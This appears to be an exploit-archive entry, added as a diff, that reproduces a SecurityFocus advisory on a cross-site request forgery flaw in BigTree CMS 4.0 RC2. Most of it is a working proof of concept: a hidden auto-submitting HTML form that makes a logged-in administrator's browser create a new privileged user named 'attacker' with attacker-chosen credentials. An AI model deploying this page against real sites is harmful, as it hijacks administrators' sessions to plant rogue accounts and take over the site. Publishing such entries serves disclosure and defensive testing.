@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/61702/info
+
+BigTree CMS is prone to a cross-site request-forgery vulnerability.
+
+Exploiting this issue may allow a remote attacker to perform certain unauthorized actions and gain access to the affected application. Other attacks are also possible.
+
+BigTree CMS 4.0 RC2 is vulnerable; other versions may also be affected. 
+
+<form action="http://www.example.com/site/index.php/admin/users/create/" method="post" name="main">
+<input type="hidden" name="email" value="user@email.com">
+<input type="hidden" name="password" value="password">
+<input type="hidden" name="level" value="1">
+<input type="hidden" name="name" value="attacker">
+<input type="hidden" name="company" value="company">
+<input type="submit" id="btn">
+</form>
+<script>
+document.main.submit();
+</script>
